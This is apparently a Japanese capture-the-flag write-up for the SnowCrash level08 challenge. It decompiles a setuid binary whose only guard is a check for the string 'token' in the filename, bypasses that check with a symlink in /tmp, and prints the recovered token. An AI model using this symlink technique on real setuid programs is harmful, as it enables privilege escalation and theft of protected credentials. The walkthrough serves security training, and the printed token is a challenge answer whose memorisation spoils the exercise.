## ~に存在するファイルを確認
```sh
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

## ghidraで逆アセンブル
```c
void main(int param_1,undefined4 *param_2)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  int in_GS_OFFSET;
  undefined local_414 [1024];
  int local_14;

  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 == 1) {
    printf("%s [file to read]\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)param_2[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)param_2[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",param_2[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## 関数のポイント
- `strstr`を使用し、`argv[1]`に`token`文字列が含まれているか確認している。もし、含まれている場合はエラーになる。
- `argv[1]`で指定されたファイルを開き`read`した内容を出力している。

## エクスプロイト
`token` 文字列含めないようにして`token file`を指すようなシンボリックリンクを作成すれば`strstr`のチェックを回避できる。

```sh
level08@SnowCrash:~$  ln -s /home/user/level08/token /tmp/hoge
level08@SnowCrash:~$  ./level08 /tmp/hoge
quif5eloekouj29ke0vouxean
```